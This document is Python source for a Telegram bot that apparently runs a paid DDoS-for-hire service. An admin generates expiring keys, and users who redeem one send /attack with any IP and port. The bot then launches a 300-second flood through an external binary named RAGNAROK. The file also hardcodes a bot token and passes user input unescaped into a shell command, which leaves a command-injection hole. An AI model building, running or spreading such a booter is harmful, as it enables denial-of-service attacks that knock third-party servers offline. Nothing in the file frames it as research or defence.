#!/usr/bin/python3
import telebot
import datetime
import random
import string
import subprocess
import threading
from telebot import types

# TELEGRAM BOT TOKEN
bot = telebot.TeleBot('7973805250:AAE1umqUG8ZhI5Ev0FQe5w-NmkdDtI-dXBs')

# GROUP AND CHANNEL DETAILS
GROUP_ID = "-1002252633433"
CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
ADMINS = [7129010361]

# GLOBAL VARIABLES
user_attack_status = {}
keys = {}  # Generated keys with expiry dates
user_keys = {}  # Users who redeemed keys

# FUNCTION TO GENERATE RANDOM KEYS
def generate_key(length=10):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

# /GENKEY COMMAND (ADMIN ONLY)
@bot.message_handler(commands=['genkey'])
def generate_access_key(message):
    if message.from_user.id not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠️ USAGE: /genkey <DAYS>")
        return

    try:
        days = int(command[1])
    except ValueError:
        bot.reply_to(message, "❌ DAYS MUST BE A NUMBER!")
        return

    expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
    new_key = generate_key()
    keys[new_key] = expiry_date

    bot.reply_to(message, f"✅ NEW KEY GENERATED:\n🔑 `{new_key}`\n📅 Expiry: {expiry_date.strftime('%Y-%m-%d')}", parse_mode="Markdown")

# /REDEEM COMMAND
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠️ USAGE: /redeem <KEY>")
        return

    user_id = message.from_user.id
    key = command[1]

    if key not in keys:
        bot.reply_to(message, "❌ INVALID KEY!")
        return

    if datetime.datetime.now() > keys[key]:
        bot.reply_to(message, "⏳ THIS KEY HAS EXPIRED!")
        del keys[key]
        return

    user_keys[user_id] = keys[key]
    del keys[key]

    bot.reply_to(message, f"🎉 SUCCESSFULLY REDEEMED!\n📅 Valid till: {user_keys[user_id].strftime('%Y-%m-%d')}", parse_mode="Markdown")

# ATTACK FUNCTION (ACTUAL ATTACK)
def start_attack(user_id, target, port):
    user_attack_status[user_id] = True
    try:
        subprocess.run(f"./RAGNAROK {target} {port} 300 CRACKS", shell=True, check=True, timeout=300)
    except subprocess.TimeoutExpired:
        bot.send_message(GROUP_ID, f"❌ ATTACK ON `{target}:{port}` TIMEOUT HO GAYA!")
    except subprocess.CalledProcessError:
        bot.send_message(GROUP_ID, f"❌ ATTACK ON `{target}:{port}` FAILED!")
    user_attack_status[user_id] = False
    bot.send_message(GROUP_ID, f"✅ ATTACK ON `{target}:{port}` COMPLETE!")

# /ATTACK COMMAND
@bot.message_handler(commands=['attack'])
def send_attack_command(message):
    user_id = message.from_user.id
    command = message.text.split()

    if user_id not in user_keys:
        bot.reply_to(message, "❌ PEHLE /redeem KARKAY ACCESS LO!")
        return

    if datetime.datetime.now() > user_keys[user_id]:
        bot.reply_to(message, "⏳ TERA ACCESS EXPIRE HO CHUKA HAI! ADMIN SE BAAT KAR.")
        return

    if len(command) != 3:
        bot.reply_to(message, "⚠️ USAGE: /attack <IP> <PORT>")
        return

    target, port = command[1], command[2]

    try:
        port = int(port)
    except ValueError:
        bot.reply_to(message, "❌ PORT NUMBER HONA CHAHIYE!")
        return

    if user_attack_status.get(user_id, False):
        bot.reply_to(message, "⚠️ TERA EK ATTACK PEHLE SE CHAL RAHA HAI!")
        return

    bot.send_message(message.chat.id, f"🔥 ATTACK STARTING ON `{target}:{port}` FOR `300 SECONDS`!")

    attack_thread = threading.Thread(target=start_attack, args=(user_id, target, port))
    attack_thread.start()

# /MYINFO COMMAND
@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = message.from_user.id
    expiry = user_keys.get(user_id, "❌ NOT REDEEMED")
    attack_status = "✅ ON" if user_attack_status.get(user_id, False) else "❌ OFF"

    if expiry != "❌ NOT REDEEMED" and datetime.datetime.now() > expiry:
        expiry = "⏳ EXPIRED"

    info_msg = f"""
🔹 **USER INFO** 🔹
👤 USER ID: `{user_id}`
🛡️ KEY STATUS: `{expiry}`
📅 EXPIRY DATE: `{expiry if expiry == "❌ NOT REDEEMED" or expiry == "⏳ EXPIRED" else expiry.strftime('%Y-%m-%d')}`
⚡ ATTACK STATUS: `{attack_status}`
"""
    bot.reply_to(message, info_msg, parse_mode="Markdown")

# START POLLING
bot.polling(none_stop=True)